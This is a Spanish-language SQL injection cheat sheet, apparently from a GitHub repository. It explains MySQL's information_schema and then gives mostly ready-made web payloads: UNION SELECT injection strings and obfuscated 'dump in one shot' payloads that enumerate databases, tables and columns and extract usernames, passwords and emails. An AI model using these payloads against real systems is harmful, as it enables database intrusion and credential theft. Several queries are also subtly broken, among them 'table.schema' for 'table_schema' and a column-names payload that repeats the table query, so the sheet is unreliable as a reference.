# SQLi: schema, schemata & DIOS

## Introducción

## Esquema `information_schema`

El esquema `information_schema` es **un esquema especial que se encuentra en la mayoría de los sistemas de gestión de bases de datos (DBMS)**, incluidos `MySQL`, `PostgreSQL`, `Oracle` y otros. Este esquema contiene información sobre los metadatos de la base de datos, como `tablas`, `columnas`, `restricciones`, `privilegios` y más.

Dentro del esquema `information_schema`, la **tabla `schemata`** es una **tabla estándar que almacena información sobre los esquemas** (bases de datos) presentes en el sistema. La columna `schema_name` de esta tabla contiene los nombres de los esquemas. 

- Cuando se ejecuta el query [`SELECT schema_name FROM information_schema.schemata;`](https://github.com/Fz3r0/Fz3r0_-_SQLi/blob/main/SQLi-Mega-Hints/02-SQLi-schema-schemata-&-DIOS.md#-query-basic), se está accediendo a esta tabla específica en el esquema `information_schema` y seleccionando la columna `schema_name`. Como esta tabla está presente en todos los DBMS compatibles con el estándar `information_schema`, **este query funciona en la mayoría de los casos para obtener una lista de los nombres de los esquemas en la base de datos.** 

Es importante tener en cuenta que la disponibilidad y el contenido exacto de la tabla `schemata` pueden variar ligeramente según el DBMS utilizado, pero en general, esta tabla se encuentra presente en la mayoría de los sistemas de gestión de bases de datos y proporciona información sobre los esquemas en la base de datos.

---

- `information_schema` **NO** es una base de datos en sí misma, sino un esquema especial que se encuentra en la mayoría de los sistemas de gestión de bases de datos. Es un componente estándar que proporciona información sobre los metadatos de la base de datos.

- Dentro del esquema `information_schema`, hay varias tablas que almacenan información sobre diferentes aspectos de la base de datos, como `tablas`, `columnas`, `restricciones`, `privilegios`, `rutinas almacenadas`, etc. Estas tablas tienen nombres como `schemata`, `tables`, `columns`, `constraints`, `privileges`, entre otros:

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/32909a84-ebfe-4ba7-87a4-42a708c6b8d5)

---

<br>

<br>

<br>

<br>

## 💀 Basics: `information schema` & `data`

### 💉 SQL Query: Basic schema info

````sql
## Schema Name AKA Databases Names Dump
SELECT schema_name FROM information_schema.schemata;

## Table Name AKA Tables Names Dump
SELECT table_name FROM information_schema.tables WHERE table_schema=database(); -- Opción 1
SELECT table_name FROM information_schema.tables WHERE table_schema='fz3r0_gaming_extravaganza'; -- Opción 2
SELECT table_name FROM information_schema.tables WHERE table_schema='fz3r0_gaming_extravaganza' ORDER BY table_name ASC LIMIT 0,1; -- Opción 3 LIMIT & ORDER

## Column Name AKA Column Names Dump
SELECT column_name FROM information_schema.columns WHERE table_name='usuarios'; -- Tabla "usuarios" de TODAS las DB
SELECT column_name FROM information_schema.columns WHERE table_name='usuarios' and table_schema=database(); -- Tabla "usuarios" de database() opt1
SELECT column_name FROM information_schema.columns WHERE table_name='usuarios' and table_schema='fz3r0_gaming_extravaganza'; -- Tabla "usuarios" de database() opt2
SELECT column_name FROM information_schema.columns WHERE table_name='usuarios' and table_schema='fz3r0_gaming_extravaganza' ORDER BY 'usuarios' ASC LIMIT 0,1; -- Tabla "usuarios" de 


````

---

### 💉 Web Injection: Extract `Database Names`, `Tables of a Database`, `Column Names`

#### Group Concat

````py
## Database Names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata 

## Tables of a Database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[$database],4,5,6

## Column Names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[$table name],4,5,6
````

#### Normal

````py
## Database Names
-1' UniOn Select 1,2,3,schema_name FROM information_schema.schemata LIMIT 0,1 ,5,6

## Tables of a Database
-1' UniOn Select 1,2,3,table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0,1 ,5,6

## Column Names
-1' UniOn Select 1,2,3,table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0,1 ,5,6


````

---

### Data

#### Group Concat

- `MySQL` Query:
````sql
select * from usuarios union select 1,2,3,4,5,6,7,8,9;

select * from usuarios union select 1,2,3,GROUP_CONCAT(username,password,email),5,6,7,8,9;

SELECT GROUP_CONCAT(username,password,mail,' ::: ') FROM usuarios;
````

- `SQLi`: Web + Offuscation
````py
-1' UniOn Select 1,2,3,(SELECT+GROUP_CONCAT(username,0x3a,password,0x3a,Email+SEPARATOR+0x3c62723e)+FROM+usuarios),5,6
````

#### 1-Shot

- `MySQL` Query:
````sql
## 1 shot
SELECT * FROM usuarios CONCAT(username,password,mail);
````

- `SQLi`: Web + Offuscation
````py
-1' UniOn Select 1,2,3,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(usuarios)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,0x3a,password,0x3a,mail,0x3c62723e))))x),5,6
````

#### 2-Shot

- `MySQL` Query:
````sql
SELECT GROUP_CONCAT(username,password,mail) FROM usuarios;
````

- `SQLi`: Web + Offuscation
````py
-1' UniOn Select 1,2,3,(SELECT+GROUP_CONCAT(0x3c62723e,username,password,mail)+FROM (usuarios)),5,6
````

#### 3-Shot

- `MySQL` Query:
````sql
UNION SELECT GROUP_CONCAT(username,password,mail) FROM usuarios;
````

concat(version(),' ::: ',user(),' ::: ',database(),(SELECT * FROM usuarios WHERE CONCAT(username,password,mail));

- `SQLi`: Web + Offuscation
````py
-1' UniOn Select 1,2,3,concat(0x416c69656e205368616e75203a3a20,version(),0x3a3a3a,user(),0x3a3a3a,database(),(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(usuarios)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,password,mail,0x3c62723e))))x)),5,6
````


### 💉 Group Concat

#### Basic

````sql
## Group Concat Basic Query
SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata;

## Limitando a 1 en caso que solo deje arrojar un resultado
SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata limit 0,1;
````

#### Variantes

````sql
## Agregando un string para separador en forma de ':'
SELECT GROUP_CONCAT(schema_name SEPARATOR ' : ') FROM information_schema.schemata;

## Mini DIOS
SELECT GROUP_CONCAT('Database PWNed: ',schema_name) FROM information_schema.schemata;
````

---

### 💉 Concat

#### Basic

````sql
## Concat Basic Query
SELECT concat(schema_name) FROM information_schema.schemata;
````

#### Variantes

````sql
## Agregando un string para separador en forma de ':'
SELECT concat(schema_name, ' : ') FROM information_schema.schemata;

## Mini DIOS: DB Enum (schema enum)
SELECT concat('Database PWNed : ',(schema_name)) FROM information_schema.schemata;
````

---

<br>

<br>

<br>

<br>

## 💀 Query Basics: `Union` + `Group Concat`

### `Union Select` Progression:

````sql
## Original example v1:
select username,password from users;

## Original example v2:
select username,password from users where username = 'F0n3';

## Basic Union Select (v1)
select username,password from users union select 1,2;

## Condition Union Select (v2):
select username,password from users where username = 'F0n3' union select 1,2;

## Condition Union Select, strings a palcer (v2):
select username,password from users where username = 'F0n3' union select 'izquierda','derecha';
````

---

<br>

<br>

<br>

<br>

## 💀 `schema_name`: Databases Names Enum

### 💉 `Union Select` + `schema_name`

- `Recordatorio`: El `UNION SELECT` en ocasiones necesita de un `LIMIT` en caso que haya error en la visualización.

````sql
##     Tip: básicamente se inserta el basic query (SELECT schema_name FROM information_schema.schemata;) dentro de un UNION pero se le quita el SELECT para que no se duplique ;)

## Basic Union Select (v1)
SELECT username,password FROM users UNION SELECT 1,schema_name FROM information_schema.schemata;

## Condition Union Select (v2):
SELECT username,password FROM users where username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata;

## Condition Union Select (v2) + LIMIT:
SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 0,1;
SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 1,1;
SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 2,1;

## Condition Union Select (v2) + LIMIT grupal (casi no se usa, los agrupa dependiendo el número):
SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 0;
SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 1;
SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 2;
````

---

### 💉 `Group Concat` + `Union Select` + `schema_name`

- `Recordatorio`: Group Concat no necesita `LIMIT` ya que se devuelve en una sola linea ;)

````sql
##     Tip: básicamente se inserta el query de union select un "GROUP_CONCAT" (GROUP CONCAT(schema_name)) dentro de un UNION pero se le quita el SELECT para que no se duplique ;)

## Basic Union Select (v1)
SELECT username,password FROM users UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata;

## Condition Union Select (v2):
SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata;
````

---

<br>

<br>

<br>

<br>

## 💀 `table_name`: Tables Names Enum

### 💉 `Union Select` + `schema_name`

- `Recordatorio`: El `UNION SELECT` en ocasiones necesita de un `LIMIT` en caso que haya error en la visualización.

````sql
##     Tip: básicamente se inserta el basic query (SELECT table_name FROM information_schema.tables FROM database();) dentro de un UNION pero se le quita el SELECT para que no se duplique ;)
##     OJO!!! Se pone el "WHERE table.schema = database()" [o el nombre de la base de datos] de lo contrario dumpea las ablas de TODAS las DB. 

## Basic Union Select (v1) (Dumpeando todas las tablas de todas las DB)
SELECT username,password FROM users UNION SELECT 1,table_name FROM information_schema.tables;
## Basic Union Select (v1) (Dumpeando únicamente las tablas de: database())
SELECT username,password FROM users UNION SELECT 1,table_name FROM information_schema.tables WHERE table.schema = database();
SELECT username,password FROM users UNION SELECT 1,table_name FROM information_schema.tables WHERE table.schema = "Fz3r0_Corporations";

## Condition Union Select (v2) (Todas las tablas de Todas las DB)
SELECT username,password FROM users where username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables;
## Condition Union Select (v2) (Dumpeando únicamente las tablas de: database())
SELECT username,password FROM users where username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables WHERE table.schema = database();
SELECT username,password FROM users where username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables WHERE table.schema = "Fz3r0_Corporations";

## Condition Union Select (v2) + LIMIT:
SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables WHERE table.schema = database() LIMIT 0,1;
SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables WHERE table.schema = database() LIMIT 1,1;
SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables WHERE table.schema = database() LIMIT 2,1;


````

---

### 💉 `Group Concat` + `Union Select` + `TABLE_name`

- `Recordatorio`: Group Concat no necesita `LIMIT` ya que se devuelve en una sola linea ;)

````sql
##     Tip: básicamente se inserta el query de union select un "GROUP_CONCAT" (GROUP CONCAT(schema_name)) dentro de un UNION pero se le quita el SELECT para que no se duplique ;)

## Basic Union Select (v1)
SELECT username,password FROM users UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata;

## Condition Union Select (v2):
SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata;
````

